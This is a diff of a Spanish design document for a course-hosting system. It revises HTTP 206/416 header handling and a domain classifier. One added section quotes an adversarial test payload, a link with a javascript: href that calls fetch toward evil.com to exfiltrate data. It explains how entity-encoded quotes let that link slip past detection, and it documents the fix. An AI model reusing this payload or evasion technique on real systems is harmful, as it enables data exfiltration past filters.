@@ -409,9 +409,35 @@ Es el mismo trabajo que cortar en memoria, y no repite la primera cicatriz de `H
 
 La respuesta parcial: `206`, `Content-Range: bytes d-h/total`, `Content-Length` del tramo. La
 completa suma `Accept-Ranges: bytes` — **sin esa cabecera el navegador ni siquiera intenta pedir
-un rango**. El `416` lleva `Content-Range: bytes */total`. Las demás cabeceras (CSP, `ETag`,
-`Cache-Control`, `nosniff`) van igual en los tres caminos: una respuesta parcial sin CSP sería un
-hueco por el que se sirve contenido sin política.
+un rango**. El `416` lleva `Content-Range: bytes */total`.
+
+Las cabeceras de **seguridad e identidad del recurso** —CSP, `ETag`, `nosniff`— van igual en los
+tres caminos: una respuesta parcial sin CSP sería un hueco por el que se sirve contenido sin
+política.
+
+> **Corregido el 2026-09-18, en revisión.** Este párrafo decía «las demás cabeceras (CSP, `ETag`,
+> `Cache-Control`, `nosniff`) van igual en los tres caminos», y **arrastró al `Cache-Control` sin
+> que nadie lo pensara**: la frase se justificaba por la CSP. El resultado era un `416` con
+> `public, max-age=31536000, immutable` y sin `Vary: Range` — almacenable según el RFC 9111 §3, y
+> con la URL como única clave para un proxy o CDN ingenuo. Un `GET` posterior **sin** `Range`
+> podría recibir ese 416 guardado: el curso caído para todos los que estén detrás de esa caché, por
+> un año, por una petición mal formada de un solo reproductor.
+>
+> El `416` se aparta en dos cabeceras, a propósito: `Cache-Control: no-store` y
+> `Content-Type: text/plain` —su cuerpo es un texto de error, no el video, y anunciar `video/mp4`
+> con `nosniff` encima es mentirle al navegador—. **El `Cache-Control` no es una política de
+> seguridad.**
+
+Y el cuerpo se entrega **tal cual lo devuelve Postgres**, sin `Buffer.from` ni `.slice()`: cada uno
+de esos copia, y sumados a la copia que ya hace Prisma al decodificar el `bytea`, un `GET` sin
+`Range` de un video de 200 MB movería ~600 MB transitorios — la misma falla que esta sección fue a
+arreglar, sobreviviendo en el único camino que todavía toca el archivo entero.
+
+Si la fila desapareciera entre las dos consultas (no hay transacción, y el borrado de un paquete
+arrastra sus archivos en cascada), se responde **404**. Un `?? new Uint8Array(0)` ahí sería peor que
+el error: respondería `200` con el `Content-Length` del archivo y cero bytes de cuerpo, y Node no
+cierra una respuesta que no cumple su `Content-Length` — el reproductor se queda esperando para
+siempre, sin nada en los registros.
 
 ### 4.D · `dominiosDe` distingue enlace de carga
 
@@ -428,6 +454,27 @@ un `fetch()`, un `window.location` o en cualquier texto de un `.js`, cuenta como
 Esa asimetría es lo que impide que sea una puerta: un despacho real **carga** al tercero —en un
 iframe o redirigiendo— y ambas cosas se siguen viendo. El escaneo de los `.js` locales, que es
 donde un driver de despacho arma su URL, no se toca.
+
+**Y la exención vale sólo para una NAVEGACIÓN.** Añadido el 2026-09-18, tras encontrar el agujero
+en revisión con pruebas adversariales:
+
+```html
+<a href="javascript:fetch(&quot;https://evil.com/exfiltra&quot;)">Continuar</a>
+```
+
+Eso clasificaba **AUTOCONTENIDO**, cuando antes del filtro daba `DESPACHO`. La causa es fina:
+`&quot;` **no es una comilla literal**, así que el grupo `[^"']+` que captura el `href` no se corta
+ahí y el dominio queda *dentro* de lo capturado, contándose como destino de enlace. Con comillas
+reales el `'` corta la captura y el dominio ya se detectaba.
+
+Pero un `href` con esquema `javascript:` **ejecuta código en el documento actual** y transmite al
+hacer clic, y la CSP sí lo gobierna (`connect-src`). Un `data:` tampoco es navegación a otro sitio:
+va a un documento de origen opaco. Ninguno de los dos es «la persona se va al sitio del tercero, en
+otra pestaña y con su propia sesión», que es el argumento entero del filtro.
+
+La condición se escribe **en positivo** —esquemas que SÍ son navegación: `http`, `https`,
+relativa o protocol-relative— y no como lista negra: una lista negra se queda corta el día que
+aparezca `vbscript:` o cualquier otro esquema nuevo.
 
 Alternativa descartada: quitarle el enlace al paquete. Resuelve este caso y deja el defecto en pie
 para el siguiente curso que enlace a una norma, a un manual o a la intranet — que es lo normal en
